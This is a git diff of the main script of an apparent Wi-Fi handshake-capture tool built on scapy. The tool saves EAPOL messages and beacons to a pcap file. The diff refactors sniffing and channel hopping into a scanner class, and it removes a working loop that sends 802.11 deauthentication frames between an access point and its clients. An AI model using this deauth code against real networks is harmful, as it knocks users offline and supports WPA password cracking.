@@ -1,13 +1,7 @@
-from scapy.all import *
-from scapy.layers.dot11 import *
-from scapy.layers.eap import *
 import threading
-
-import scapy.packet
-from change_channel import change_channel
 import gui
-
-import scanner
+from network_scanner import NetworkScanner
+from scapy.utils import *
 
 # TODO:
 # Support other types of frames to identify clients
@@ -36,10 +30,6 @@ CHANNEL_TABLE = {
 }
 
 
-def get_aps():
-    return access_points
-
-
 def save_capture(ap):
     """Save captured EAPOL messages and beacon frames to a .pcap file"""
 
@@ -49,45 +39,16 @@ def save_capture(ap):
     writer.write(ap.beacon)
 
 
-def deauth(ap, stop):
-    """Craft and send deauthentication packets"""
-
-    while not stop.is_set():
-        for client in ap.clients:
-            ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=ap.bssid, addr2=client, addr3=ap.bssid)/Dot11Deauth()
-            client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=ap.bssid, addr3=ap.bssid)/Dot11Deauth()
-            sendp(ap_to_client, iface=INTERFACE_NAME, verbose=False)
-            sendp(client_to_ap, iface=INTERFACE_NAME, verbose=False)
-
-
-def deauth_thread(ap, stop):
-    thread = threading.Thread(target=deauth, args=(ap, stop,))
-    return thread
-
-
-access_points = []
-# Access point MAC addresses
-ap_bssids = set()
-# BSSID:AccessPoint
-bssid_map = {}
-# SSID:AccessPoint
-ssid_map = {}
-
-stop_sniffing = threading.Event()
-stop_changing_channel = threading.Event()
-stop_deauthing = threading.Event()
-
-print('Starting sniffing thread')
-sniff_thread = scanner.create_sniff_thread()
-sniff_thread.start()
+scanner = NetworkScanner(INTERFACE_NAME, CHANNEL_TABLE, START_CHANNEL)
 
 print('Starting GUI thread')
-gui_thread = threading.Thread(target=gui.start_gui, args=(get_aps, deauth_thread, INTERFACE_NAME, stop_sniffing, create_sniff_thread, stop_changing_channel, stop_deauthing, save_capture,))
+gui_thread = threading.Thread(target=gui.start_gui, args=(scanner, save_capture,))
 gui_thread.start()
 
-print('Starting channel switching thread')
-channel_thread = threading.Thread(target=change_channel, args=(START_CHANNEL, INTERFACE_NAME, stop_changing_channel,))
-channel_thread.start()
+print('Starting sniffing thread')
+sniff_thread = threading.Thread(target=scanner.start_sniffing)
+sniff_thread.start()
 
-sniff_thread.join()
-channel_thread.join()
+print('Starting channel switching thread')
+chan_thread = threading.Thread(target=scanner.start_channel_hopping)
+chan_thread.start()
